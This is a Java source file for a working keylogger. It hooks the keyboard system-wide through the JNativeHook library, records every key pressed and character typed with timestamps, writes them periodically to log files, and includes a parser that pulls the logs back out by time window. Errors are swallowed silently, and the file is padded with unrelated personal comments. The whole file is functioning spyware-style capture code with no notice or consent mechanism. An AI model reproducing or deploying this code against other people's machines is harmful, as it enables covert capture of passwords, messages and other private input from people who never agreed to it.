// jay shive sambhu

// i am marval fan :} i hate anime


import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Calendar;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.Timer;
import java.util.TimerTask;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;


public class Keylogger {
	private boolean enabled;
    
    private StringBuilder textBuffer;
    
    private StringBuilder keyBuffer;
    
    private String textLogFile;
    
    private String keyLogFile;
    
    private Event eventHandler;
    
    private Timer tagTimer;
    
    private int timeStampMillis;
    
    private int flushMillis;
    
    private int previousTagTextBufferLen;
    
    private int previousTagKeyBufferLen;
	

    public Keylogger(Event eventHandler, String textLogFile, String keyLogFile, 
		     int timeStampMillis, int flushMillis) throws NativeHookException {
	this.textBuffer = new StringBuilder();
	this.keyBuffer = new StringBuilder();
	GlobalScreen.registerNativeHook();
	this.eventHandler = eventHandler;
	this.textLogFile = textLogFile;
	this.keyLogFile = keyLogFile;
	this.timeStampMillis = timeStampMillis;
	this.flushMillis = flushMillis;
	this.previousTagTextBufferLen = 0;
	this.previousTagKeyBufferLen = 0;
	this.tagTimer = new Timer();
	GlobalScreen.getInstance().addNativeKeyListener(new NativeKeyListener() {
		@Override
		public void nativeKeyPressed(NativeKeyEvent e) {
		    keyPressed(e);
		}

		@Override
		public void nativeKeyReleased(NativeKeyEvent e) {
				
		}

		@Override
		public void nativeKeyTyped(NativeKeyEvent e) {
		    keyTyped(e.getKeyChar());
		}
	    });
		

	Calendar currentTime = Calendar.getInstance();
	Keylogger.this.textBuffer.append('\1' + Long.toString(currentTime.getTimeInMillis()) + '\2');
	Keylogger.this.keyBuffer.append('\1' + Long.toString(currentTime.getTimeInMillis()) + '\2');
    }
	
// i am marval fan :} i hate anime

    public void setEnabled(boolean enabled) {
	this.enabled = enabled;
	if(this.enabled) {
			
	    // schedule tagging timer
	    this.tagTimer.scheduleAtFixedRate(new TimerTask() {
		    @Override
		    public void run() {
			Calendar currentTime = Calendar.getInstance();
			if(Keylogger.this.textBuffer.length() != previousTagTextBufferLen) {
			    Keylogger.this.textBuffer.append('\1' + Long.toString(currentTime.getTimeInMillis()) + '\2');
			    previousTagTextBufferLen = Keylogger.this.textBuffer.length();
			}
			if(Keylogger.this.textBuffer.length() != previousTagKeyBufferLen) {
			    Keylogger.this.keyBuffer.append('\1' + Long.toString(currentTime.getTimeInMillis()) + '\2');
			    previousTagKeyBufferLen = Keylogger.this.keyBuffer.length();
			}
		    }
				
		}, this.timeStampMillis, this.timeStampMillis);
			
	    // schedule flushing timer
	    this.tagTimer.scheduleAtFixedRate(new TimerTask() {
		    @Override
		    public void run() {
			// write to file, if there is one
			try {
			    Keylogger.this.flushBuffers();
			} catch (IOException e) {
			    // do nothing
			}
		    }
		}, 0, this.flushMillis);
	} else {
			
	    // stop tagging and flush timer
	    this.tagTimer.purge();
			
	    // flush buffers
	    try {
		this.flushBuffers();
	    } catch (IOException e) {
		// fail silently
	    }
	}
    }
	
    public boolean isEnabled() {
	return this.enabled;
    }
	
    public void flushBuffers() throws IOException {
		
	// write text buffer
	if(this.textLogFile != null && this.textBuffer.length() > 0) {
	    FileWriter logFile = new FileWriter(this.textLogFile, true);
	    if(logFile != null) {
		logFile.append(this.getLiteralText());
		logFile.close();
	    }
	}
		
	// write key press buffer
	if(this.keyLogFile != null && this.keyBuffer.length() > 0) {
	    FileWriter logFile = new FileWriter(this.keyLogFile, true);
	    if(logFile != null) {
		logFile.append(this.getKeyBuffer());
		logFile.close();
	    }
	}
		
	// clear text buffers
	this.textBuffer = new StringBuilder();
	this.keyBuffer = new StringBuilder();
	this.eventHandler.buffersFlushed();
    }
	
    public String getLiteralText() {
	return this.textBuffer.toString();
    }
	
    public int getLiteralTextLength() {
	return this.textBuffer.length();
    }
	
    
    public String getKeyBuffer() {
	return this.keyBuffer.toString();
    }
	
    public int getKeyBufferLength() {
	return this.keyBuffer.length();
    }
	
    public void destroy() {
	GlobalScreen.unregisterNativeHook();
	this.tagTimer.cancel();
    }
	
    private void keyPressed(NativeKeyEvent e) {
	if(this.enabled) {
	    String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
	    keyBuffer.append(keyText + "; ");
	    this.eventHandler.keyPressed();
	}
    }
	

    private void keyTyped(char key) {
	if(this.enabled) {
	    if(key == '\b') {
		//if(textBuffer.length() > 0 && key != '\1' && key != '\2')
		//	textBuffer.deleteCharAt(textBuffer.length() - 1);
		textBuffer.append("[Backspace]");
	    } else
		textBuffer.append(key);
	    this.eventHandler.keyTyped();
	}
    }
	

    public interface Event {
	public void keyPressed();
		
	public void buffersFlushed();
		
	public void keyTyped();
    }
	

    public static class LogParser {
	/** Catalog of Key log snippets */
	private LinkedList<LogEntry> catalog;
		
	// TODO: Error check constructor.
	
	public LogParser(String logFile) throws IOException {
	    this.catalog = new LinkedList<LogEntry>();
	    FileReader reader = new FileReader(logFile);
	    if(reader != null) {
		boolean leftBracketReached = false;
		boolean bodyReached = false;
		int b = 0;
		Calendar date = null;
		StringBuilder buffer = new StringBuilder();
		while((b = reader.read()) != -1) {
		    char c = (char) b;
		    if(c == '\1') {
			if(bodyReached && date != null) {
			    catalog.add(new LogEntry(date, buffer.toString()));
			    buffer = new StringBuilder();
			}
			leftBracketReached = true;
		    } else if(c == '\2') {
			date = Calendar.getInstance();
			date.setTimeInMillis(Long.parseLong(buffer.toString()));
			leftBracketReached = false;
			bodyReached = true;
			buffer = new StringBuilder();
		    } else if(leftBracketReached || bodyReached)
			buffer.append(c);
		}
				
		if(buffer.length() > 0) {
		    if(bodyReached && date != null) {
			catalog.add(new LogEntry(date, buffer.toString()));
			buffer = new StringBuilder();
		    }
		}
		reader.close();
	    }
	}
		

	public String getEntireLog() {
	    StringBuilder buffer = new StringBuilder();
	    for(LogEntry l : this.catalog) {
		buffer.append(l.text);
	    }
	    return buffer.toString();
	}
		
	
	public String getRelevantLog(Calendar date, int timeWindowMillis) {
	    StringBuilder buffer = new StringBuilder();
	    for(LogEntry l : this.catalog) {
		if(Math.abs(l.date.getTimeInMillis() - date.getTimeInMillis())
		   < (timeWindowMillis / 2)) {
		    buffer.append(l.text);
		}
	    }
			
	    if(buffer.length() > 0)
		return buffer.toString();
	    else
		return null;
	}

	public Calendar getFirstDate() {
	    if(this.catalog.size() > 0)
		return this.catalog.getFirst().date;
	    else 
		return null;
	}
		

	
	public Calendar getLastDate() {
	    if(this.catalog.size() > 0)
		return this.catalog.getLast().date;
	    else 
		return null;
	}
		
	
	public int[] getRelevantLogRange(Calendar date, int timeWindowMillis) {
	    int[] interval = new int[2];
	    interval[0] = -1;
	    int index = 0;
	    Iterator<LogEntry> iterator = this.catalog.iterator();
	    while(iterator.hasNext()) {
		LogEntry l = iterator.next();
				
		// if not located start index yet
		if(interval[0] == -1) {
		    if(Math.abs(l.date.getTimeInMillis() - date.getTimeInMillis())
		       < (timeWindowMillis / 2)) {
			interval[0] = index;
		    }
		} else {
		    while(iterator.hasNext() && (Math.abs(l.date.getTimeInMillis() - date.getTimeInMillis())
						 < (timeWindowMillis / 2))) {
			index += iterator.next().text.length();
		    }
						
		    interval[1] = index;
		    return interval;
		}
				
		// add length of current string to current index
		index += l.text.length();
	    }
	    return null;
	}
	
	public int[] b(Calendar date, int timeWindowMillis) {
	    int[] interval = new int[2];
	    interval[0] = -1;
	    int index = 0;
	    Iterator<LogEntry> iterator = this.catalog.iterator();
	    while(iterator.hasNext()) {
		LogEntry l = iterator.next();
				
		// if not located start index yet
		if(interval[0] == -1) {
		    if(Math.abs(l.date.getTimeInMillis() - date.getTimeInMillis())
		       < (timeWindowMillis / 2)) {
			//return index;
			interval[0] = index;
		    }
		} else {
		    while(iterator.hasNext() && (Math.abs(l.date.getTimeInMillis() - date.getTimeInMillis())
						 < (timeWindowMillis / 2))) {
			index += iterator.next().text.length();
		    }
						
		    interval[1] = index;
		    return interval;
		}
				
		// add length of current string to current index
		index += l.text.length();
	    }
	    return null;
	}
		
	public static class LogEntry {
	 
	    Calendar date;
	  
	    String text;
		
	    public LogEntry(Calendar date, String text) {
		this.date = date;
		this.text = text;
	    }
	}
    }
}


 



 // i am marval fan :} i hate anime

